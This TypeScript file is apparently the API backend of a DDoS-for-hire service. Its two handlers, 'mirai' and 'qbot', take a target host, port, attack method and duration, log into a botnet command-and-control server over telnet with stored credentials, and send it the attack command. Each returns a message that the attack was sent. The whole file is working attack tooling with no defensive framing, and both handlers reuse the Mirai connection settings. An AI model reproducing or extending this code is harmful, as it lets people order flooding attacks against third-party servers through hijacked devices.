import { settings } from 'settings';

const TelnetClient = require('telnetit');
const cli: any = new TelnetClient('C2');

export const mirai = (req: any, res: any) => {
	const { key, host, port, method, time }: any = req.params as any;

	if (!settings.MIRAI.METHODS.includes(method)) {
		return res.status(400).send('Method not allowed');
	}

	const connconf: Object = {
		"host": settings.MIRAI.IP,
		"port": settings.MIRAI.PORT,
		"username": settings.MIRAI.USER,
		"password": settings.MIRAI.PASSWORD,
		"enpassword": settings.MIRAI.PASSWORD
	};

	cli.connect(connconf, (err: any) => {
		if(err) {
			return res.send({
				status: 'FAILED',
				message: err,
			});
		}
		cli.write(`${settings.QBOT.COMMAND_PREFIX}${method} ${host} ${port} ${time}`, () => {
			cli.read((err: any, recv: any) => {
			if(err) {
				return res.send({
					status: 'FAILED',
					message: err,
				});
			}
			recv = recv.join('');

			console.log('receive:',recv);
			cli.close();

			return res.send({
				status: 'OK',
				message: `[Mirai] [${key}] Attack sent to ${host}:${port} with ${method} method for ${time} seconds`,
			});
		  });
		});
	});
}

export const qbot = (req: any, res: any) => {
	const { key, host, port, method, time }: any = req.params as any;

	if (!settings.QBOT.METHODS.includes(method)) {
		return res.status(400).send('Method not allowed');
	}

	const connconf: Object = {
		"host": settings.MIRAI.IP,
		"port": settings.MIRAI.PORT,
		"username": settings.MIRAI.USER,
		"password": settings.MIRAI.PASSWORD,
		"enpassword": settings.MIRAI.PASSWORD
	};

	cli.connect(connconf, (err: any) => {
		if(err) {
			return res.send({
				status: 'FAILED',
				message: err,
			});
		}
		cli.write(`${settings.QBOT.COMMAND_PREFIX}${method} ${host} ${port} ${time}`, () => {
			cli.read((err: any, recv: any) => {
			if(err) {
				return res.send({
					status: 'FAILED',
					message: err,
				});
			}
			recv = recv.join('');

			console.log('receive:',recv);
			cli.close();

			return res.send({
				status: 'OK',
				message: `[qBot] [${key}] Attack sent to ${host}:${port} with ${method} method for ${time} seconds`,
			});
		  });
		});
	});
}